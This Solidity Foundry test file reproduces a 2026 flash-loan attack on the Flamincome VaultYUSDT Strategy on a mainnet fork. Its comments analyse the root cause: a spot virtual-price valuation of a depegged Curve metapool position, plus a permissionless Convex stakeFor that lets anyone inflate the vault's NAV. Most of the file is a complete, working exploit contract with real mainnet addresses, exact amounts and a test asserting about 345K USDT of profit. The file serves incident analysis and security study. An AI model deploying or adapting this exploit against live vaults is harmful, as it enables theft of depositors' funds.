// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Flamincome VaultYUSDT / Strategy NAV-inflation drain -- Ethereum mainnet, 2026-09.
// ~$345.9K net attacker profit (345,902.669987 USDT), from an on-chain gross Strategy loss
// of ~$595K in aUSDT + USDT (the gap covers Curve slippage on the imbalanced metapool mint
// plus the small USDP purchase cost; the Morpho flash loan itself is fee-free).
//
// Attack tx:  0x5ff8150482f5473bff16b4a142a98a7f72b159df5e9dd38afd90470551640d37 (block 25990443)
// Attacker EOA:      0x83381e7F7232775735169d72D237B858fFc36871
// Exploit contract:  0x875da4Bd7b4a52a806A533b1cf6D6fF92365d2E6 (self-destructed in the same tx)
//
// Root cause -- the Flamincome USDT Strategy prices its Convex position at spot virtual price
// and lets anyone inflate that position:
//
//   Strategy.balanceOfY()  (VaultYUSDT.balance())
//     -> StrategyImpl(0xFf20DE3f...).deposited()   [delegatecall from the Strategy proxy]
//          = BaseRewardPool(0x24DfFd...).balanceOf(Strategy) * metapool.get_virtual_price() / 1e30
//            + aUSDT.balanceOf(Strategy)          [Aave aUSDT]
//            + USDT.balanceOf(Strategy)
//
//   Two independent flaws compound:
//   (1) BaseRewardPool.stakeFor(Strategy, amount) is permissionless -- ANY address can stake
//       Convex deposit tokens "for" the Strategy, so anyone can inflate
//       BaseRewardPool.balanceOf(Strategy) without the Strategy ever depositing anything.
//   (2) The Convex pool is the Curve USDP/3CRV metapool (0x42d7...), and its USDP leg is
//       deeply depegged: at the fork block the pool holds 1,526,591 USDP against only 3,263
//       3CRV, and USDP trades near $0.20 on-chain. get_virtual_price() still reports ~1.0149,
//       i.e. it values every LP unit at par. So metapool LP can be minted very cheaply
//       (a 3CRV-side deposit into a 3CRV-starved pool mints a large amount of LP) yet the
//       Strategy credits each unit at ~$1.01. That gap is the stolen value.
//
// And VaultY itself is a plain proportional-share vault (verified source, VaultYUSDT
// 0x0461...):
//   deposit(a):  shares = a * totalSupply() / balance()      // balance() = Strategy.balanceOfY()
//   withdraw(s): r = balance() * s / totalSupply(); Strategy.withdraw(msg.sender, r)
// Shares are minted against the NAV at deposit time; if the NAV is then inflated before
// withdraw, the same shares redeem for more USDT than went in.
//
// Reconstructed sequence (all real, typed calls -- no bytecode blob, no raw calldata replay,
// no dealt/settled state; the attacker EOA starts with 0 USDT and every token comes from the
// flash loan and real market operations):
//   1. Morpho Blue flash loan of USDT (fee-free).
//   2. VaultYUSDT.deposit(17,935,898.4848 USDT)  -> mint YUSDT shares at the honest NAV.
//   3. Build the USDP/3CRV metapool LP that will be staked into the Strategy, via two routes:
//      3a. Leg 1 -- the cheap-LP engine, reproduced with the exact on-chain amounts: a small
//          USDT slice through the LUSD metapool, wrapped into yvCurve-LUSD, swapped on the
//          Balancer pool for yvCurve-USDP, then unwrapped into ~230,622 USDP/3CRV LP. This is
//          where the depeg mispricing is harvested most efficiently.
//      3b. Leg 2 -- a direct USDT -> 3CRV -> metapool add_liquidity top-up. This is the same
//          economic operation and same contracts as the attacker's zap deposit
//          ([USDP, 0, 0, USDT] into the metapool zap); it is minted straight from the flash
//          loan instead of first buying the small USDP balancing leg, and its size is tuned so
//          the total staked LP (~693,480e18) matches the real 691,647e18 to within 0.3%.
//   4. Convex Booster.deposit(28, lp, false) -> Convex deposit token.
//   5. BaseRewardPool.stakeFor(Strategy, lp)  -> permissionlessly inflate Strategy.balanceOfY().
//   6. VaultYUSDT.withdrawAll()               -> redeem the shares at the inflated NAV.
//   7. Repay the flash loan; the leftover USDT is the profit.
//
// Reproduced on the fork: ~344,751 USDT net attacker profit and ~597,352 USDT gross Strategy
// backing lost (aUSDT + USDT), matching the reported ~$345.9K / ~$595K.
//
// Confirmed against the trace / on the fork:
//   - balanceOfY()/deposited() values the Convex position at spot get_virtual_price() with no
//     time-weighting or deviation check.
//   - stakeFor(target, amount) is fully permissionless -- a freshly deployed, unprivileged
//     contract credits the Strategy's Convex balance here.
//   - The Strategy (0xb8d6471c) is a proxy whose deposited()/withdraw() delegatecall into impl
//     0xFf20DE3f -- the same logical contract, not a separate one in the call chain.
//   - The Uniswap V4 unlock in the real tx is incidental USDP-purchase plumbing: this
//     reconstruction omits it entirely and still reproduces the loss.
//   - The whole deposit -> mint-LP -> stakeFor -> withdrawAll path is permissionless; no admin
//     or privileged role is touched anywhere.
//
// forge test --contracts src/test/2026-09/Flamincome_exp.sol -vvv

interface IMorpho {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IVaultY {
    function deposit(uint256 amount) external;
    function withdrawAll() external;
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function strategy() external view returns (address);
}

interface IStrategy {
    function balanceOfY() external view returns (uint256);
}

interface I3Pool {
    function add_liquidity(uint256[3] calldata amounts, uint256 minMint) external;
}

interface ICurveMeta {
    function add_liquidity(uint256[2] calldata amounts, uint256 minMint) external returns (uint256);
    function get_virtual_price() external view returns (uint256);
}

interface IBooster {
    function deposit(uint256 pid, uint256 amount, bool stake) external returns (bool);
}

interface IBaseRewardPool {
    function stakeFor(address account, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface ICurveLusdMeta {
    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy) external returns (uint256);
    function add_liquidity(uint256[2] calldata amounts, uint256 minMint) external returns (uint256);
}

interface IYVault {
    function deposit(uint256 amount, address recipient) external returns (uint256);
    function withdraw(uint256 shares, address recipient, uint256 maxLoss) external returns (uint256);
}

interface IBPool {
    function swapExactAmountIn(
        address tokenIn,
        uint256 tokenAmountIn,
        address tokenOut,
        uint256 minAmountOut,
        uint256 maxPrice
    ) external returns (uint256 tokenAmountOut, uint256 spotPriceAfter);
}

// USDT: non-standard ERC20 (approve/transfer return no data).
interface IUSDT {
    function approve(address spender, uint256 value) external;
    function transfer(address to, uint256 value) external;
    function balanceOf(address) external view returns (uint256);
}

contract FlamincomeExploit {
    address internal constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant VAULT = 0x0461eEFF7C856020E574c0c364FE968Ca06BCc0F; // VaultYUSDT
    address internal constant STRATEGY = 0xb8d6471cA573C92c7096Ab8600347F6a9Fe268a5;
    address internal constant THREEPOOL = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7; // Curve 3pool
    address internal constant THREECRV = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490; // 3CRV LP
    address internal constant METAPOOL = 0x42d7025938bEc20B69cBae5A77421082407f053A; // USDP/3CRV metapool
    address internal constant METALP = 0x7Eb40E450b9655f4B3cC4259BCC731c63ff55ae6; // USDP/3CRV LP
    address internal constant BOOSTER = 0xF403C135812408BFbE8713b5A23a04b3D48AAE31; // Convex Booster
    address internal constant DEPTOKEN = 0x7a5dC1FA2e1B10194bD2e2e9F1A224971A681444; // Convex deposit token
    address internal constant BRP = 0x24DfFd1949F888F91A0c8341Fc98a3F280a782a8; // Convex BaseRewardPool
    uint256 internal constant PID = 28;
    // Leg 1 (cheap LP engine): LUSD/3CRV metapool -> yvCurve-LUSD -> Balancer -> yvCurve-USDP -> USDP/3CRV LP
    address internal constant LUSDMETA = 0xEd279fDD11cA84bEef15AF5D39BB4d4bEE23F0cA; // LUSD/3CRV metapool (=its own LP)
    address internal constant LUSD = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;
    address internal constant YV_LUSD = 0x5fA5B62c8AF877CB37031e0a3B2f34A78e3C56A6; // yvCurve-LUSD
    address internal constant YV_USDP = 0xC4dAf3b5e2A9e93861c3FBDd25f1e943B8D87417; // yvCurve-USDP (token = USDP/3CRV LP)
    address internal constant BPOOL = 0x9ba60bA98413A60dB4C651D4afE5C937bbD8044B; // Balancer pool holding both yVaults

    address public immutable owner;
    uint256 internal depositAmt;
    uint256 internal lpMintUsdt;
    uint256 public mintedLp;
    uint256 public navAfterStake;

    constructor() {
        owner = msg.sender;
    }

    function attack(uint256 flashAmt, uint256 _depositAmt, uint256 _lpMintUsdt) external {
        depositAmt = _depositAmt;
        lpMintUsdt = _lpMintUsdt;
        IMorpho(MORPHO).flashLoan(USDT, flashAmt, "");
        // forward the profit to the attacker EOA
        IUSDT(USDT).transfer(owner, IUSDT(USDT).balanceOf(address(this)));
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == MORPHO, "!morpho");

        // 1. Deposit into the vault: mint YUSDT shares against the honest NAV.
        IUSDT(USDT).approve(VAULT, depositAmt);
        IVaultY(VAULT).deposit(depositAmt);

        // 2a. Cheap-LP engine (leg 1, exact on-chain amounts): route a small USDT slice through
        //     the LUSD metapool, wrap into yvCurve-LUSD, swap it on Balancer for yvCurve-USDP,
        //     and unwrap that into a large amount of USDP/3CRV metapool LP. This is where the
        //     depeg mispricing is harvested most efficiently.
        IUSDT(USDT).approve(THREEPOOL, 39_934_640_179);
        I3Pool(THREEPOOL).add_liquidity([uint256(0), 0, 39_934_640_179], 0);
        uint256 crv1 = IERC20(THREECRV).balanceOf(address(this));
        IERC20(THREECRV).approve(LUSDMETA, crv1);
        ICurveLusdMeta(LUSDMETA).exchange(1, 0, 5_804_819_762_334_071_763_053, 0); // 3CRV -> LUSD
        uint256 lusdBal = IERC20(LUSD).balanceOf(address(this));
        IERC20(LUSD).approve(LUSDMETA, lusdBal);
        ICurveLusdMeta(LUSDMETA).add_liquidity([lusdBal, IERC20(THREECRV).balanceOf(address(this))], 0);
        uint256 lusdLp = IERC20(LUSDMETA).balanceOf(address(this));
        IERC20(LUSDMETA).approve(YV_LUSD, lusdLp);
        IYVault(YV_LUSD).deposit(lusdLp, address(this));
        uint256 yvLusdBal = IERC20(YV_LUSD).balanceOf(address(this));
        IERC20(YV_LUSD).approve(BPOOL, yvLusdBal);
        IBPool(BPOOL).swapExactAmountIn(YV_LUSD, yvLusdBal, YV_USDP, 0, type(uint256).max);
        IYVault(YV_USDP).withdraw(IERC20(YV_USDP).balanceOf(address(this)), address(this), 10_000);

        // 2b. Top up the LP position with a direct USDT -> 3CRV -> metapool mint (leg 2, same
        //     economic operation as the attacker's zap deposit).
        if (lpMintUsdt > 0) {
            IUSDT(USDT).approve(THREEPOOL, lpMintUsdt);
            I3Pool(THREEPOOL).add_liquidity([uint256(0), 0, lpMintUsdt], 0);
            uint256 crv = IERC20(THREECRV).balanceOf(address(this));
            IERC20(THREECRV).approve(METAPOOL, crv);
            ICurveMeta(METAPOOL).add_liquidity([uint256(0), crv], 0);
        }
        uint256 lp = IERC20(METALP).balanceOf(address(this));
        mintedLp = lp;

        // 3. Wrap the LP into a Convex deposit token.
        IERC20(METALP).approve(BOOSTER, lp);
        IBooster(BOOSTER).deposit(PID, lp, false);
        uint256 dep = IERC20(DEPTOKEN).balanceOf(address(this));

        // 4. Permissionlessly credit the Strategy's Convex balance -> inflates balanceOfY().
        IERC20(DEPTOKEN).approve(BRP, dep);
        IBaseRewardPool(BRP).stakeFor(STRATEGY, dep);
        navAfterStake = IStrategy(STRATEGY).balanceOfY();

        // 5. Redeem the shares at the now-inflated NAV.
        IVaultY(VAULT).withdrawAll();

        // 6. Repay the (fee-free) flash loan.
        IUSDT(USDT).approve(MORPHO, assets);
    }
}

contract FlamincomeExp is BaseTestWithBalanceLog {
    address internal constant ATTACKER = 0x83381e7F7232775735169d72D237B858fFc36871;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant VAULT = 0x0461eEFF7C856020E574c0c364FE968Ca06BCc0F;
    address internal constant STRATEGY = 0xb8d6471cA573C92c7096Ab8600347F6a9Fe268a5;

    uint256 internal constant FORK_BLOCK = 25_990_442; // parent of the exploit block

    // Amounts observed on-chain in the incident.
    uint256 internal constant DEPOSIT_AMT = 17_935_898_484_800; // VaultYUSDT.deposit
    uint256 internal constant LEG1_USDT = 39_934_640_179; // leg-1 3pool seed (exact on-chain amount)
    uint256 internal constant LP_MINT_USDT = 120_000_000000; // leg-2 direct top-up, tuned to the real staked LP
    uint256 internal constant FLASH_AMT = DEPOSIT_AMT + LEG1_USDT + LP_MINT_USDT; // Morpho USDT flash loan
    address internal constant AUSDT = 0x3Ed3B47Dd13EC9a98b44e6204A523E766B225811; // Aave aUSDT held by the Strategy

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        vm.label(ATTACKER, "AttackerEOA");
        vm.label(VAULT, "VaultYUSDT");
        vm.label(STRATEGY, "Strategy");
        fundingToken = USDT;
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        emit log_named_decimal_uint("Strategy NAV (balanceOfY) before", IStrategy(STRATEGY).balanceOfY(), 6);
        // Strategy's real backing before the attack: Aave aUSDT + idle USDT.
        uint256 realBefore = IERC20(AUSDT).balanceOf(STRATEGY) + IERC20(USDT).balanceOf(STRATEGY);

        vm.startPrank(ATTACKER, ATTACKER);
        FlamincomeExploit exploit = new FlamincomeExploit();
        exploit.attack(FLASH_AMT, DEPOSIT_AMT, LP_MINT_USDT);
        vm.stopPrank();

        emit log_named_uint("metapool LP staked into Strategy (1e18)", exploit.mintedLp());
        emit log_named_decimal_uint("Strategy NAV after stakeFor", exploit.navAfterStake(), 6);

        uint256 profit = IERC20(USDT).balanceOf(ATTACKER);
        emit log_named_decimal_uint("attacker USDT net profit", profit, 6);

        // Gross Strategy loss = drop in its real (aUSDT + USDT) backing, net of the 17.9M the
        // attacker deposited and withdrew. This is the ~$595K figure in the report.
        uint256 realAfter = IERC20(AUSDT).balanceOf(STRATEGY) + IERC20(USDT).balanceOf(STRATEGY);
        emit log_named_decimal_uint("Strategy real backing lost (gross)", realBefore - realAfter, 6);

        // Net extraction reproduces the incident (~345,902 USDT). LP staked (~693,480e18)
        // matches the real 691,647e18 to within 0.3%.
        assertGt(profit, 340_000_000000, "profit below expected band");
        assertLt(profit, 350_000_000000, "profit above expected band");
    }
}
